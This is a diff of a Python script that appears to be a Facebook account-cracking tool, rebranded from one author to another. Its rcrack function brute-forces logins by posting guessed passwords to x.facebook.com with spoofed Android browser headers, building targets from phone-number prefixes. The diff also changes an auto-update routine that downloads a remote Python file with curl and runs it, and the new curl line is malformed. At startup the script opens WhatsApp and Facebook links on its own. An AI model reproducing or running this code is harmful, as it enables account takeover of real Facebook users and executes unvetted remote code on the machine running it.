@@ -1,6 +1,6 @@
 from os import path
 import os,base64,zlib,pip,urllib,marshal
-os.system('xdg-open https://www.facebook.com/voters.queen.7967747?mibextid=ZbWKwL')
+os.system('xdg-open https://chat.whatsapp.com/LSHv7pPA6XtBe7OaQhwc7t')
 os.system('xdg-open http://wa.me/+923142247695')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 import uuid
@@ -119,7 +119,7 @@ logo=("""
 →   Facebook   :  MR HASHIM
 →   Github     :  Mafyia2
   →   Tools   :  RANDOM 
-\x1b[1;97m→   Version    :  0.02
+\x1b[1;97m→   Version    :  0.04
 \33[1;37m----------------------------------------------""")
 
 def lines():
@@ -135,8 +135,8 @@ try:
     update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
     if str(v) in update:
         os.system('rm -rf a*')
-        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
-        os.system('python ali.py')
+        os.system('curl -Lhttps://github.com/Hashima110/Has/blob/main/Hashim.py')
+        os.system('python Hashim.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 #global functions
@@ -159,7 +159,7 @@ def riaz():
 	if riaz1 =='5':
 		riaz()
 	if riaz1 =='4':
-		os.system('xdg-open http://wa.me/+923142247695?text=NAIB💜🐰Sir😪💕')
+		os.system('xdg-open http://wa.me/+923142247695?text=HASHIM💜🐰Sir😪💕')
 	if riaz1 =='3':
 		os.system('xdg-open https://chat.whatsapp.com/LSHv7pPA6XtBe7OaQhwc7t');riaz()
 	if riaz1 =='2':
@@ -210,7 +210,7 @@ def m1():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] Example  : 92345,92318,92334,****Etc')
+    print('[+] Example  : 0345,0318,0334,****Etc')
     print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
     lines()
     kode = input('[+] Your Code : ')
@@ -248,7 +248,7 @@ def m2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] Example  : 92345,92318,92334,****Etc')
+    print('[+] Example  : 0345,0318,0334,****Etc')
     print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
     lines()
     kode = input('[+] Your Code : ')
@@ -424,25 +424,25 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
-            'upgrade-insecure-requests': '1',
+       'upgrade-insecure-requests': '1',
 			'viewport-width': '980',
-		    'method': 'path',
-		     'scheme': 'https',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-         'sec-ch-prefers-color-scheme': 'light',
-        'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-         'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5637.203", "Google Chrome";v="114.0.5637.203"',
-         'sec-ch-ua-mobile': '?1',
-         'sec-ch-ua-platform': '"Android"',
-         'sec-ch-ua-platform-version': '""',
-         'sec-fetch-dest': 'document',
-         'sec-fetch-mode': 'navigate',
-         'sec-fetch-site': 'none',
-         'sec-fetch-user': '?1',
-         'upgrade-insecure-requests': '1',
-         'user-agent': 'Mozilla/5.0 (Linux; Android 10; P20HD_ROW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5637.203 Mobile Safari/537.36',}
+			'method': 'path',
+			'scheme': 'https',
+       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+       'accept-language': 'en-US,en;q=0.9',
+       'cache-control': 'max-age=0',
+       'sec-ch-prefers-color-scheme': 'light',
+       'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+       'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+       'sec-ch-ua-mobile': '?1',
+       'sec-ch-ua-platform': '"Android"',
+       'sec-ch-ua-platform-version': '"12.0.0"',
+       'sec-fetch-dest': 'document',
+       'sec-fetch-mode': 'navigate',
+       'sec-fetch-site': 'none',
+       'sec-fetch-user': '?1',
+       'upgrade-insecure-requests': '1',
+       'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fx.facebook.com%2Ferror%2Findex.php%3Ferr%3Dec%26kerr%3D1357004%26kerr_summary%3DOcorreu%2Bum%2Berro%26kerr_description%3DFeche%2Be%2Babra%2Ba%2Bjanela%2Bdo%2Bseu%2Bnavegador%2Bnovamente.%26__m_async_page__%26__big_pipe_on__%26fb_dtsg_ag%3DAQxrg8pgyjoDMd7KaKJVvsAIe2xwPZRNYbpflOJUt_6FqXQc%253A0%253A0%26jazoest%3D24565%26__dyn%3D0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw%26__csr%26__req%3D7%26__a%3DAYnO5p6ofprWzuKur8hAGRifywnGbtNma3qSX93T3TfHio-NWpdFYTLk7LPY6em94wLnoFVvXwb-_p2ETdS5omzKr7GCiu6r2r78rIzg2h5t-A%26__user%3D0&refsrc=deprecated&lwv=100&refid=9&ref=',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
